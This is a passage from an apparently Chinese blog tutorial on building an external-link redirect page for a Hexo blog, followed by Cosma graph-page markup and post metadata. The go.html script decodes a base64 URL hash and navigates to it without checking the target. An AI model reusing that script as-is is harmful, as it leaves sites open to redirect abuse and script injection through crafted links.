+ NewhrefStr = 'href=&quot;' + '/pages/go.html#' + NewhrefStr + '&quot;';
</code></pre>
<p>这样链接就变成了我想要的样子：<code>/pages/go.html#</code>+ 编码为 Base64 的外部链接地址。</p>
<h3>建立中间页</h3>
<p>从上面转换后的中间连接可以知道，我设置的中间页位置为 <code>/pages/go.html</code>。其实我只是在 <code>sourse/pages</code> 目录下新建了 <code>go.md</code> 文件而已，Hexo 会自动渲染成 HTML。我这样做只是为了和某些页面统一而已。你也可以自己另外设计独立的页面。</p>
<p><code>go.md</code> 基本内容如下（省略了样式代码，保留主要的 HTML，看思路即可）：</p>
<pre><code class="language-markdown">---
title: 
date: 2024-02-22 00:00:00
aside: false
top_img: 
---

&lt;link rel=&quot;stylesheet&quot; href=&quot;/css/simple_page.css&quot;&gt;

&lt;body&gt;
  &lt;meta charset=&quot;utf-8&quot;/&gt;
  &lt;title&gt;GO Page&lt;/title&gt;
  &lt;div&gt;
	&lt;p class=&quot;h3&quot;&gt;您即将在 &amp;nbsp; &lt;span id=&quot;go_time&quot;&gt;inf&lt;/span&gt;s &amp;nbsp;后跳转到以下地址&lt;/p&gt;
	&lt;p class=&quot;to_address text_align&quot;&gt;
	&lt;/p&gt;
	&lt;a href=&quot;&quot; class=&quot;to_url button&quot; style=&quot;color: #FFFFFF;&quot;&gt;立即跳转&lt;/a&gt;
  &lt;/div&gt;
&lt;/body&gt;

&lt;script&gt;
// 链接解析与设置
  const params = window.location.hash;
  const encodedTarget = params.slice(1);
  const target = atob(encodedTarget);  // 对应插件的编解码方法
  
  if (target) {
     console.log('解析到的target',target,params,encodedTarget);
    document.getElementsByClassName('to_url button')[0].href = target;
    document.getElementsByClassName('to_address text_align')[0].textContent = '' + target; // 直接显示目标地址    
  } else {
    console.error('外部链接跳转未指定重定向目标。');
  }

// 倒计时逻辑
var second=5;
var time = document.getElementById(&quot;go_time&quot;);
function show() {
	
	if(second==0){
		//跳转页面
		location.href=target;
	}else{
		second--; // 放在if的分支里可以避免出现负数的情况
	}
	//用来动态设置里面的内容
	time.innerHTML=second+&quot;&quot;;

}
//用来实现这个一秒实现一次这个方法
setInterval(show,1000);
&lt;/script&gt;

</code></pre>
<p>不太建议全站启用外链中间页，只对文章内容启用中间页即可。</p>
<p>附一份白名单，涵盖程序员常用外链（云服务平台、博客网站、笔记网站等）：</p>
<pre><code class="language-yaml">exclude:  
- 'github.com'  
- 'tencent.com'  
- 'aliyun.com'  
- 'csdn.net'  
- 'juejin.cn'  
- 'jianshu.com'  
- 'cnblogs.com'  
- 'zhihu.com'  
- 'bilibili.com'  
- 'gitee.com'  
- 'feishu.cn'  
- 'yuque.com'  
- 'kdocs.cn'  
# 对应子域名白名单  
- &quot;*.uuanqin.top&quot; # 这条有必要。否则 www.uuanqin.top 会识别为外链  
- '*.github.com'  
- '*.tencent.com'  
- '*.aliyun.com'  
- '*.csdn.net'  
- '*.juejin.cn'  
- '*.jianshu.com'  
- '*.cnblogs.com'  
- '*.zhihu.com'  
- '*.bilibili.com'  
- '*.gitee.com'  
- '*.feishu.cn'  
- '*.yuque.com'  
- '*.kdocs.cn'
# 如果你想让友链文章不受阻塞，可以在此继续添加
</code></pre>
<h1>后记</h1>
<p>如果平时不喜欢各大网站中间页可以考虑安装这个脚本：<a href="https://greasyfork.org/zh-CN/scripts/412612-open-the-f-king-url-right-now">Open the F**king URL Right Now (greasyfork.org)</a>。或者尝试安装这个插件（我没试过）：<a href="https://chromewebstore.google.com/detail/skip-redirect/jaoafjdoijdconemdmodhbfpianehlon">Skip Redirect (google.com)</a></p>
<blockquote>
<p>[!cite] Open the F**king URL Right Now<br>
很多时候，在网上读到一篇好文章，我们被作者思想的深度，逻辑论证的缜密，内容的旁征博引所折服，这时我们往往也想去作者给出的相关链接上看看是怎样的奇文给了作者启发，写出了这样一篇振聋发聩的好文，于是点击链接，但是很多时候会突然跳出来一行字，要用户手动复制该链接贴到地址栏访问才行，被网站这样一折腾，刚刚提起来的求知欲一下子烟消云散了。</p>
<p>一次两次也倒罢了，但最近此风甚长，还有愈演愈烈之势，好好的超链接变成了一个个的『超不链接』，其他网站为了留存用户，延长用户停留时间，不惜以暴制暴，进行恶性竞争，结果就是互联网的用户体验变成了各大公司利益的牺牲品，在夹缝中艰难地生存，昔日的信息高速公路上就这样被人为地挖了许多坑。</p>
<p>为了把互联网体验变回我们熟悉的样子，为了让超链接能痛快地把用户送到终点，就写了这样一个简单的脚本......</p>
<p>——<a href="https://greasyfork.org/zh-CN/scripts/412612-open-the-f-king-url-right-now">OldPanda</a></p>
</blockquote>
<blockquote>
<p>[!cite] 安全跳转必要性<br>
有朋友问，为何要增设这样一个看似多余的步骤？“直接浏览不更直接吗？何必增添一个看似拖沓的跳转环节？”还有人，将其误解为纯粹的技术冗余，误以为这是效仿某些平台所设置的“用户不便”之举......Hexo-SafeGo 插件的核心目的，并非直接进行安全检测，而是作为一种自我保护机制，默默守护着网站的声誉与访问者的信任。现在的插件并没有能力能够主动扫描并消除网络中的所有威胁，但却能有效避免自身网站因缺少必要的安全协议而被浏览器标记为“不安全”，这一小步跳跃，实则是维护网站形象与信誉的一大步。</p>
<p>此插件的实施，更像是一份无形的“免责声明”，它向访问者无声宣告：作为网站管理者，我已经采取措施确保连接的安全性，即便遭遇外部链接可能带来的不确定性，也已事先提醒，尽到了告知的责任。在这个信息错综复杂的时代，这样的透明度与责任感显得尤为重要。</p>
<p>—— <a href="https://blog.qyliu.top/">@清羽飞扬</a></p>
</blockquote>
<p>本文经历了过期又翻新的过程。</p>
<p>讯飞星火参与正则代码编写，所以这种苦力活最适合交给 AI 做。</p>
<h1>本文参考</h1>
<ul>
<li><a href="https://cuojue.org/read/hexo-filter-links.html">Hexo的外链转内链插件 - 春风吹 - 浅秋枫影的博客 (cuojue.org)</a></li>
<li><a href="https://www.eallion.com/hugo-redirect-landing-page/">Hugo 外部链接跳转提示页面-大大的小蜗牛 (eallion.com)</a></li>
<li><a href="https://koobai.com/zhongjiantiaozhuan/">HUGO 外链跳转到中间页 - 空白Koobai</a></li>
<li><a href="https://blog.csdn.net/he1234555/article/details/112099087">js实现倒计时跳转页面_在网页中显示倒计时读秒效果,比如543210当数据小于0时指定跳转到其他页面-CSDN博客</a></li>
<li><a href="https://blog.csdn.net/mouday/article/details/114676558">NodeJS：字符串和base64相互转换_nodejs string to base64-CSDN博客</a></li>
<li><a href="https://blog.csdn.net/gulang03/article/details/88854858">使用 JavaScript 进行 Base64 编码与解码_js base64解码-CSDN博客</a></li>
<li><a href="https://blog.csdn.net/ZYS10000/article/details/115265721">JavaScript中 切割截取字符串的几种方法_js 截取字符串-CSDN博客</a></li>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Document/getElementsByClassName">Document: getElementsByClassName() method - Web APIs | MDN (mozilla.org)</a></li>
</ul>


                
            </main>

            <footer class="list-content-container">
                

                
                <details class="record-backlinks" open="open">
                    <summary class="menu-title">
                        backlinks
                        <span class="badge">4</span>
                    </summary>

                    <ul class="record-backlinks-list">
                        
                        <li data-target-id="1495212389">
                            <a href="#1495212389">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_博客相关);">⬤</span>
                                    
                                    <span style="color: var(--n_hexo);">⬤</span>
                                    
                                </span>
                                
                                <span>Hexo 框架 Btterfly 主题引入 Waline 评论系统及国内正常访问</span>
                                
                                <div class="record-links-context hover">
                                    <ul>
<li><a href="#3709373237" title="定制自己的 Waline 评论系统" class="record-link ">定制自己的 Waline 评论系统</a></li>
<li><a href="#3015602463" title="为评论系统增加输入提醒【Waline】" class="record-link ">为评论系统增加输入提醒【Waline】</a></li>
<li><a href="#3790495434" title="Hexo 博客与 Waline 评论区实现外链跳转中间页" class="record-link highlight">Hexo 博客与 Waline 评论区实现外链跳转中间页</a></li>
</ul>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="3709373237">
                            <a href="#3709373237">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_博客相关);">⬤</span>
                                    
                                    <span style="color: var(--n_hexo);">⬤</span>
                                    
                                </span>
                                
                                <span>定制自己的 Waline 评论系统</span>
                                
                                <div class="record-links-context hover">
                                    <ol>
<li>Waline 邮件通知的设置</li>
<li>输入 QQ 邮箱自动获取 QQ 头像的配置</li>
<li>评论区美化要点</li>
<li>评论安全
<ol>
<li>设置违禁词的方法</li>
<li>设置 IP 黑名单</li>
<li>使用 Turnstile 验证码服务</li>
</ol>
</li>
<li>评论外链中间页详见：<a href="#3790495434" title="Hexo 博客与 Waline 评论区实现外链跳转中间页" class="record-link highlight">Hexo 博客与 Waline 评论区实现外链跳转中间页</a></li>
</ol>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="2346883624">
                            <a href="#2346883624">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_百味人生);">⬤</span>
                                    
                                    <span style="color: var(--n_社会生活);">⬤</span>
                                    
                                </span>
                                
                                <span>成为一名个人博客网站站长</span>
                                
                                <div class="record-links-context hover">
                                    <p>中间页的实现：<a href="#3790495434" title="Hexo 博客与 Waline 评论区实现外链跳转中间页" class="record-link highlight">Hexo 博客与 Waline 评论区实现外链跳转中间页</a></p>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="1215492985">
                            <a href="#1215492985">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_博客相关);">⬤</span>
                                    
                                    <span style="color: var(--n_hexo);">⬤</span>
                                    
                                </span>
                                
                                <span>装点你的 Butterfly 博客</span>
                                
                                <div class="record-links-context hover">
                                    <blockquote>
<p>[!warning] 来自站长的教训<br>
使用 Algolia 搜索默认主题时，注意搜索界面不要有跳转到外国网站的链接（比如 power by 的 logo），否则可能会有 wxb 来电风险。参考 <a href="#3790495434" title="Hexo 博客与 Waline 评论区实现外链跳转中间页" class="record-link highlight">Hexo 博客与 Waline 评论区实现外链跳转中间页</a>。</p>
</blockquote>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                
            </footer>
        </article>
        
        
        
        
        <article id="help" class="record">
            <main>
                <h1>Help</h1>
                
                <p>
                    <a href="https://cosma.arthurperret.fr/" target="_blank" class="link-documentation">
                        Click here to access Cosma&#39;s documentation
                    </a>
                </p>
                
                <h2>Shortcuts</h2>
                
                    <table>
                        <tbody>
                            <tr>
                                <td>Space</td>
                                <td>Re-run the force-layout algorithm</td>
                            </tr>
                            <tr>
                                <td>S</td>
                                <td>Move the cursor to Search</td>
                            </tr>
                            <tr>
                                <td>Alt + click</td>
                                <td>(on a record type) Deselect other types</td>
                            </tr>
                            <tr>
                                <td>R</td>
                                <td>Reset zoom</td>
                            </tr>
                            <tr>
                                <td>Alt + R</td>
                                <td>Reset the display</td>
                            </tr>
                            <tr>
                                <td>C</td>
                                <td>Zoom in on the selected node</td>
                            </tr>
                            <tr>
                                <td>F</td>
                                <td>Switch to Focus mode</td>
                            </tr>
                            <tr>
                                <td>Escape</td>
                                <td>Close the active record</td>
                            </tr>
                        </tbody>
                    </table>
            </main>
        </article>

        

        <article id="credits" class="record">
            <main>
                
                    
                    <h1 class="metas-title">半方池水半方田 - 文章关系图谱</h1>
                    

                    
                    <p class="metas-author">wuanqin</p>
                    

                    
                    <p class="metas-description">只能懂一点点</p>
                    
                    
                    <hr>
                

                
                <div class="logo">
                    <?xml version="1.0" encoding="UTF-8"?>
<svg enable-background="new 0 0 283.46 68" version="1.1" viewBox="0 0 283.46 68" xml:space="preserve" xmlns="http://www.w3.org/2000/svg">
<style type="text/css">
	.st0{fill:#147899;}
	.st1{fill:#02385C;}
	.st2{fill:#001A37;}
</style>
	<path class="st0" d="m227.63 41.56v0.68-0.35-0.33m-15.62-15.3c-6.32 0-12.02 3.81-14.44 9.65s-1.08 12.56 3.39 17.03c2.99 2.99 6.98 4.58 11.05 4.58 2.01 0 4.04-0.39 5.98-1.19 0.26-0.11 0.52-0.22 0.77-0.34v-12.1c-0.86 2.91-3.56 5.03-6.75 5.03-2.85 0-5.41-1.71-6.5-4.34s-0.49-5.66 1.53-7.67c1.35-1.35 3.15-2.06 4.98-2.06 0.91 0 1.82 0.18 2.69 0.54 1.99 0.83 3.46 2.5 4.05 4.5v-12.09c-2.05-0.98-4.33-1.53-6.75-1.54"/>
	<path class="st0" d="m67.32 26.18c-4 0-8 1.53-11.05 4.58-6.1 6.1-6.1 16 0 22.1 3.05 3.05 7.05 4.58 11.05 4.58s8-1.53 11.05-4.58l-6.07-6.07c-1.31 1.32-3.1 2.06-4.96 2.06h-0.02c-3.19 0-5.97-2.14-6.8-5.22-0.82-3.08 0.52-6.32 3.28-7.92 1.1-0.63 2.31-0.94 3.52-0.94 1.82 0 3.62 0.71 4.98 2.06l6.07-6.07c-3.05-3.05-7.05-4.58-11.05-4.58"/>
	<path class="st0" d="m137.46 26.26h-12.18c-5.5 0-9.96 4.46-9.96 9.96s4.46 9.96 9.96 9.96h5.13c0.76 0 1.37 0.61 1.37 1.37s-0.61 1.37-1.37 1.37h-12.18v8.59h12.32c4-0.05 7.58-2.5 9.09-6.21s0.65-7.96-2.18-10.79c-1.86-1.87-4.38-2.92-7.01-2.92h-0.03-5.13c-0.76 0-1.37-0.62-1.37-1.38s0.62-1.37 1.37-1.37h12.18v-8.58"/>
	<path class="st0" d="m227.63 42.24c-0.13 5.9-3.58 11.21-8.88 13.74v1.49h8.88v-15.23m-8.87-2.36v4.01c0.19-0.64 0.29-1.31 0.29-2s-0.1-1.37-0.29-2.01m8.87-13.65h-8.88v1.57c5.15 2.48 8.74 7.69 8.88 13.76v-15.33"/>
	<path class="st1" d="m218.76 27.8v12.08c0.19 0.64 0.29 1.31 0.29 2 0 0.7-0.1 1.37-0.29 2v12.09c5.3-2.53 8.74-7.84 8.88-13.74v-0.68c-0.14-6.06-3.73-11.28-8.88-13.75"/>
	<path class="st0" d="m153.79 26.23h-8.52v31.24h8.52-8.52v-17.57-0.18c0.07-5.65 3.57-10.48 8.52-12.49v-1"/>
	<path class="st0" d="m177.75 26.23c-3.65 0-6.96 1.43-9.41 3.75 2.58 2.45 4.21 5.91 4.26 9.74v0.18c0-2.84 2.3-5.15 5.15-5.15 2.84 0 5.15 2.3 5.15 5.15v17.57h8.52v-17.57-0.18c-0.1-7.47-6.18-13.49-13.67-13.49"/>
	<path class="st0" d="m158.93 26.23c-1.82 0-3.56 0.36-5.15 1v30.24-17.57c0-2.84 2.3-5.15 5.15-5.15s5.15 2.3 5.15 5.15v-0.18c0.05-3.83 1.67-7.28 4.26-9.74-2.45-2.32-5.76-3.75-9.41-3.75"/>
	<path class="st1" d="m153.79 27.23c-4.94 2.01-8.45 6.84-8.52 12.49v0.18 17.57h8.52v-30.24"/>
	<path class="st1" d="m168.34 29.98c-2.58 2.45-4.21 5.91-4.26 9.74v0.18 17.57h8.52v-17.57-0.18c-0.05-3.83-1.68-7.28-4.26-9.74"/>
	<g id="cosma-roll">
		<path class="st0" d="m95.49 46.43-4.08 2.36v8.55h8.17v-8.55l-4.09-2.36m4.08-20.34h-8.17v8.55l4.09 2.36 4.08-2.36v-8.55"/>
		<path class="st0" d="m103.65 41.71-4.08 2.36v4.71l7.4 4.27 4.08-7.07-7.4-4.27m-19.65-11.34-4.08 7.07 7.4 4.27 4.08-2.36v-4.71l-7.4-4.27"/>
		<path class="st1" d="m99.57 44.07-4.08 2.36 4.08 2.36v-4.72m-8.17-9.43v4.71l4.09-2.35-4.09-2.36"/>
		<path class="st0" d="m87.32 41.71-7.4 4.27 4.08 7.08 7.4-4.27v-4.71l-4.08-2.37m19.65-11.34-7.4 4.27v4.71l4.08 2.36 7.4-4.27-4.08-7.07"/>
		<path class="st1" d="m91.4 44.07v4.71l4.08-2.36-4.08-2.35m8.17-9.43-4.08 2.36 4.08 2.36v-4.72"/>
		<path class="st1" d="m91.4 39.36-4.08 2.36 4.08 2.36v-4.72m8.17 0v4.71l4.08-2.36-4.08-2.35"/>
		<polyline class="st2" points="95.49 37 91.4 39.36 91.4 44.07 95.49 46.43 99.57 44.07 99.57 39.36 95.49 37"/>
	</g>
	<path class="st0" d="m50.43 16.17h-15c-0.69 0-1.25 0.56-1.25 1.25v48.56c0 0.69 0.56 1.25 1.25 1.25h15v-9.9h-5.09c-0.69 0-1.25-0.56-1.25-1.25v-28.74c0-0.69 0.56-1.25 1.25-1.25h5.09v-9.92"/>
	<path class="st0" d="m32.53 16.17h-15c-0.69 0-1.25 0.56-1.25 1.25v48.56c0 0.69 0.56 1.25 1.25 1.25h15v-9.9h-5.09c-0.69 0-1.25-0.56-1.25-1.25v-28.73c0-0.69 0.56-1.25 1.25-1.25h5.09v-9.93"/>
	<path class="st0" d="m247.89 16.17h-15v9.92h5.09c0.69 0 1.25 0.56 1.25 1.25v28.74c0 0.69-0.56 1.25-1.25 1.25h-5.09v9.9h15c0.69 0 1.25-0.56 1.25-1.25v-48.56c0.01-0.68-0.56-1.25-1.25-1.25"/>
	<path class="st0" d="m265.82 16.17h-15v9.92h5.09c0.69 0 1.25 0.56 1.25 1.25v28.74c0 0.69-0.56 1.25-1.25 1.25h-5.09v9.9h15c0.69 0 1.25-0.56 1.25-1.25v-48.55c0-0.69-0.56-1.26-1.25-1.26"/>
</svg>
                </div>
                

                <p>
                    Version 2.4.0
                    •
                    License GPL-3.0-or-later</p>

                <ul>
                    
                    <li>Arthur Perret</li>
                    
                    <li>Guillaume Brioudes</li>
                    
                    <li>Clément Borel</li>
                    
                    <li>Olivier Le Deuff</li>
                    

                    <li>ANR research programme <a href="https://hyperotlet.hypotheses.org/">HyperOtlet</a></li>
                </ul>

                <dl>
                    <dt><a href="https://d3js.org/" target="_blank">D3 <span class="badge">v4.13.0</span></a></dt>
                    <dd>Mike Bostock (BSD 3-Clause)</dd>
                    <dt><a href="https://mozilla.github.io/nunjucks/" target="_blank">Nunjucks <span class="badge">v3.2.3</span></a></dt>
                    <dd>James Long (BSD 2-Clause)</dd>
                    <dt><a href="https://github.com/nodeca/js-yaml" target="_blank">Js-yaml <span class="badge">v4.1.0</span></a></dt>
                    <dd>Vitaly Puzrin (MIT License)</dd>
                    <dt><a href="https://github.com/markdown-it/markdown-it" target="_blank">Markdown-it <span class="badge">v12.3.0</span></a></dt>
                    <dd>Vitaly Puzrin, Alex Kocharin (MIT License)</dd>
                    <dt><a href="https://github.com/juris-m/citeproc-js" target="_blank">Citeproc <span class="badge">v2.4.62</span></a></dt>
                    <dd>Frank Bennett (CPAL, AGPL)</dd>
                    <dt><a href="https://fusejs.io/" target="_blank">Fuse-js <span class="badge">v6.4.6</span></a></dt>
                    <dd>Kiro Risk (Apache License 2.0)</dd>
                </dl>
            </main>
        </article>

        
    </main>

    

    <script>
        const data = {"nodes":[{"id":"3237396916","label":"“禅道”的配置与数据库连接","types":["undefined"],"size":2,"strokeWidth":2,"begin":1650257016},{"id":"1813820909","label":"「多媒体与信号处理」课程笔记","types":["嵌入式"],"size":2,"strokeWidth":2,"begin":1700662223},{"id":"3449001268","label":"「蕴含」与「等价」自然语言表达的理解","types":["数学与算法"],"size":3.2,"strokeWidth":2,"begin":1712993184},{"id":"1973703782","label":"【麒麟实训】开始与结束","types":["undefined","有感而发"],"size":4.4,"strokeWidth":2,"begin":1650980770},{"id":"1433349372","label":"【麒麟实训】撷英分享","types":["undefined"],"size":3.2,"strokeWidth":2,"begin":1650983143},{"id":"3273167773","label":"AHK 鼠标增强（CClose 源码撷英）","types":["工具箱","核心协同"],"size":2,"strokeWidth":2,"begin":1685113767},{"id":"1032806896","label":"Ant Design Pro 前端项目初始化到部署上线","types":["undefined"],"size":4.4,"strokeWidth":2,"begin":1712765917},{"id":"90746120","label":"Butterfly 不改动主题源码实现自定义侧边栏","types":["博客相关","Hexo"],"size":5.6,"strokeWidth":2,"begin":1685549841},{"id":"4139834099","label":"Butterfly 侧边栏实现 Obsidian 关系图谱","types":["博客相关","Hexo"],"size":8,"strokeWidth":2,"begin":1691764229},{"id":"4033695206","label":"Butterfly 夜间模式变换顶部网站图标","types":["博客相关","Hexo"],"size":4.4,"strokeWidth":2,"begin":1689010814},{"id":"152796589","label":"Butterfly 自定义页脚（不修改主题源码）","types":["博客相关","Hexo"],"size":4.4,"strokeWidth":2,"begin":1689002192},{"id":"3315008132","label":"CSAPP LAB-1 位操作","types":["undefined"],"size":11.6,"strokeWidth":2,"begin":1716377443},{"id":"3522416439","label":"CSAPP LAB-2 二进制炸弹实验","types":["undefined"],"size":11.6,"strokeWidth":2,"begin":1716379246},{"id":"1735947091","label":"CSAPP LAB-3 缓冲区溢出炸弹","types":["undefined"],"size":11.6,"strokeWidth":2,"begin":1716709089},{"id":"165066519","label":"CSAPP LAB-4 代码优化","types":["undefined"],"size":11.6,"strokeWidth":2,"begin":1717390865},{"id":"1051831239","label":"CSAPP LAB-5 手写动态存储分配器","types":["undefined"],"size":11.6,"strokeWidth":2,"begin":1718251291},{"id":"3298282303","label":"DHT11 驱动程序","types":["嵌入式"],"size":4.4,"strokeWidth":2,"begin":1713883060},{"id":"657793374","label":"Epic 城市天际线 DLC 全破解与模组安装","types":["undefined"],"size":2,"strokeWidth":2,"begin":1692443488},{"id":"2777136240","label":"ESP8266 烧写 AT MQTT 固件","types":["嵌入式"],"size":3.2,"strokeWidth":2,"begin":1711961691},{"id":"1857161372","label":"Git-flow：git的分支管理策略","types":["undefined"],"size":2,"strokeWidth":2,"begin":1685195513},{"id":"1886753501","label":"Git基本操作学习","types":["undefined"],"size":2,"strokeWidth":2,"begin":1685173957},{"id":"888931094","label":"go-cqhttp 部署与简单编程","types":["工具箱","核心协同"],"size":6.8,"strokeWidth":2,"begin":1713438527},{"id":"3790495434","label":"Hexo 博客与 Waline 评论区实现外链跳转中间页","types":["博客相关","Hexo"],"size":6.8,"strokeWidth":2,"begin":1722786025},{"id":"681885666","label":"Hexo 博客添加漂浮物效果（可定制显示页面）","types":["博客相关","Hexo"],"size":3.2,"strokeWidth":2,"begin":1682852003},{"id":"414962704","label":"Hexo 博客的写作与装饰","types":["博客相关","Hexo"],"size":10.4,"strokeWidth":2,"begin":1685696100},{"id":"3569112562","label":"Hexo 博客适配 Obsidian 新语法","types":["博客相关","Hexo"],"size":15.2,"strokeWidth":2,"begin":1690860873},{"id":"1495212389","label":"Hexo 框架 Btterfly 主题引入 Waline 评论系统及国内正常访问","types":["博客相关","Hexo"],"size":8,"strokeWidth":2,"begin":1682584029},{"id":"3569684170","label":"JMeter的安装与使用","types":["工具箱","undefined"],"size":2,"strokeWidth":2,"begin":1650075240},{"id":"2617906225","label":"Keil 的使用技巧与问题解决","types":["嵌入式"],"size":4.4,"strokeWidth":2,"begin":1712047084},{"id":"2287168649","label":"Linux 使用 Cron 创建定时任务","types":["工具箱","核心协同"],"size":5.6,"strokeWidth":2,"begin":1701865660},{"id":"2445395019","label":"Linux 使用 nohup 后台运行程序","types":["工具箱","核心协同"],"size":4.4,"strokeWidth":2,"begin":1713414202},{"id":"1867823418","label":"Linux 服务器 HTTPS 的配置","types":["undefined"],"size":9.2,"strokeWidth":2,"begin":1701845670},{"id":"1018322944","label":"MAJOR的配置与基本使用","types":["工具箱","undefined"],"size":2,"strokeWidth":2,"begin":1648129973},{"id":"1011516134","label":"Markdown 渲染测试","types":["工具箱","核心协同"],"size":4.4,"strokeWidth":2,"begin":1685628366},{"id":"1781465711","label":"Modelsim 10.4 破解过程中找不到 License 的解决办法【虚拟机网络设置问题】","types":["嵌入式"],"size":2,"strokeWidth":2,"begin":1702125697},{"id":"4244887792","label":"mujava的安装与使用","types":["工具箱","undefined"],"size":2,"strokeWidth":2,"begin":1647688460},{"id":"107080905","label":"Nginx 的安装与反向代理配置","types":["undefined"],"size":3.2,"strokeWidth":2,"begin":1681380300},{"id":"2136059777","label":"Obsidian Internal links 双向链接渲染解决方案","types":["Archive","undefined"],"size":6.8,"strokeWidth":2,"begin":1690860873},{"id":"2349657556","label":"OLED 驱动程序","types":["嵌入式"],"size":3.2,"strokeWidth":2,"begin":1712241348},{"id":"3992879191","label":"PicGo(app) 配置腾讯云 COS 图床","types":["工具箱","核心协同"],"size":6.8,"strokeWidth":2,"begin":1647092016},{"id":"2099001034","label":"Quartus II 18.0 出现 Current license file does not support the XXX device 问题的解决","types":["嵌入式"],"size":2,"strokeWidth":2,"begin":1702718614},{"id":"2982342308","label":"RM 和 EDF 任务调度算法在 μCOSII 上的实现","types":["嵌入式"],"size":2,"strokeWidth":2,"begin":1719044981},{"id":"3753778605","label":"Scrapy-充分利用浏览器中的开发者工具","types":["工具箱","核心协同"],"size":4.4,"strokeWidth":2,"begin":1708444787},{"id":"3476966011","label":"Scrapy-入门篇","types":["工具箱","核心协同"],"size":4.4,"strokeWidth":2,"begin":1708361648},{"id":"2392872481","label":"Selenium的安装与使用","types":["工具箱","undefined"],"size":2,"strokeWidth":2,"begin":1648900434},{"id":"2966071784","label":"server、sqlite 朋友圈部署方案","types":["博客相关","Hexo"],"size":5.6,"strokeWidth":2,"begin":1691942262},{"id":"2896927132","label":"SPI 概念及案例实践（上）","types":["undefined"],"size":5.6,"strokeWidth":2,"begin":1722433192},{"id":"3886683086","label":"SPI 概念及案例实践（下）","types":["undefined"],"size":4.4,"strokeWidth":2,"begin":1722488898},{"id":"1713466548","label":"SpringBoot 中的 IOC & DI 入门","types":["undefined"],"size":4.4,"strokeWidth":2,"begin":1722530403},{"id":"2487324783","label":"SpringBoot 中的配置","types":["undefined"],"size":4.4,"strokeWidth":2,"begin":1722615059},{"id":"565697069","label":"SpringBoot 的原理以及写一个自定义 Starter","types":["undefined"],"size":6.8,"strokeWidth":2,"begin":1721136356},{"id":"2985240736","label":"SpringBoot 项目的上线方式","types":["undefined"],"size":5.6,"strokeWidth":2,"begin":1721751009},{"id":"1401105135","label":"STM32 工程的创建 - 基于 HAL 库","types":["嵌入式"],"size":9.2,"strokeWidth":2,"begin":1712058786},{"id":"1813829584","label":"STM32 工程的创建 - 基于寄存器或标准库","types":["嵌入式"],"size":9.2,"strokeWidth":2,"begin":1712038366},{"id":"3318795350","label":"STM32 延时函数（FreeRTOS）","types":["嵌入式"],"size":3.2,"strokeWidth":2,"begin":1712239631},{"id":"2115225612","label":"STM32 移植 FreeRTOS - 基于 HAL 库","types":["嵌入式"],"size":5.6,"strokeWidth":2,"begin":1712154711},{"id":"2165426052","label":"STM32 移植 FreeRTOS - 基于标准库","types":["嵌入式"],"size":6.8,"strokeWidth":2,"begin":1712036647},{"id":"3727808739","label":"STM32+ESP8266+MQTT 实现阿里云温湿度监控及 LED 点灯（FreeRTOS+标准库 or HAL）","types":["嵌入式"],"size":12.8,"strokeWidth":2,"begin":1712292590},{"id":"1135491326","label":"Typora 免费版本 or 正式版的绿色使用","types":["工具箱","核心协同"],"size":3.2,"strokeWidth":2,"begin":1718251328},{"id":"377267818","label":"Typora 应用 PicGo(app) 使用图床","types":["工具箱","核心协同"],"size":4.4,"strokeWidth":2,"begin":1647092016},{"id":"1864583727","label":"Windows 管理右键菜单","types":["工具箱"],"size":2,"strokeWidth":2,"begin":1649558872},{"id":"2653327377","label":"WordPress 上传的文件大小超过定义值问题解决","types":["博客相关","WordPress"],"size":2,"strokeWidth":2,"begin":1647101809},{"id":"2062987538","label":"WordPress 使用 HTTPS","types":["博客相关","WordPress"],"size":4.4,"strokeWidth":2,"begin":1650523410},{"id":"2497000883","label":"WordPress 修改 functions 的方法","types":["博客相关","WordPress"],"size":2,"strokeWidth":2,"begin":1650126297},{"id":"1780203637","label":"WordPress 修改文章标题前的「私密」和「密码保护」","types":["博客相关","WordPress"],"size":2,"strokeWidth":2,"begin":1648825095},{"id":"3483842810","label":"WordPress 前台页面空白的解决","types":["博客相关","WordPress"],"size":2,"strokeWidth":2,"begin":1646926720},{"id":"1360801971","label":"个人独立申请软著流程","types":["undefined","社会生活"],"size":2,"strokeWidth":2,"begin":1685526806},{"id":"2867239616","label":"串口驱动程序之「不定长字符串的接收」","types":["嵌入式"],"size":4.4,"strokeWidth":2,"begin":1712242131},{"id":"1545394726","label":"串口驱动程序之「发送数据」","types":["嵌入式"],"size":5.6,"strokeWidth":2,"begin":1712071828},{"id":"2214581713","label":"为什么个体域变化引入特性谓词时，不同量词的命题变化不一样？","types":["数学与算法"],"size":3.2,"strokeWidth":2,"begin":1712851750},{"id":"3015602463","label":"为评论系统增加输入提醒【Waline】","types":["博客相关","Hexo"],"size":5.6,"strokeWidth":2,"begin":1689090179},{"id":"2676514221","label":"代码驱动学习-快速入门 AJAX","types":["undefined"],"size":2,"strokeWidth":2,"begin":1683031189},{"id":"2052246699","label":"使用 Adobe Premiere Pro 实现 GIF 动图画面拼接","types":["工具箱"],"size":2,"strokeWidth":2,"begin":1682934072},{"id":"910498382","label":"使用 CDN 加速 WordPress 博客网站","types":["Archive","undefined"],"size":2,"strokeWidth":2,"begin":1650170796},{"id":"1151366136","label":"使用对象存储产品","types":["工具箱","核心协同"],"size":3.2,"strokeWidth":2,"begin":1647092016},{"id":"3910313174","label":"免费高效制作精美词云（Python、wordart）","types":["工具箱"],"size":2,"strokeWidth":2,"begin":1647515172},{"id":"1881411089","label":"关于 QQ 聊天发起与 QQ 邮箱即时写信的链接-即时沟通外链","types":["Archive","undefined"],"size":2,"strokeWidth":2,"begin":1647178439},{"id":"2555088146","label":"关于 wordPress 固定链接的修改以及 htaccess 文件不起作用问题的解决","types":["博客相关","WordPress"],"size":2,"strokeWidth":2,"begin":1648048565},{"id":"3118126311","label":"利用 Cron 编写简单的定时脚本（含简易的 CDN 攻击预警）","types":["工具箱","核心协同"],"size":5.6,"strokeWidth":2,"begin":1721832223},{"id":"2201181434","label":"博客域名解析管理与网站 CDN 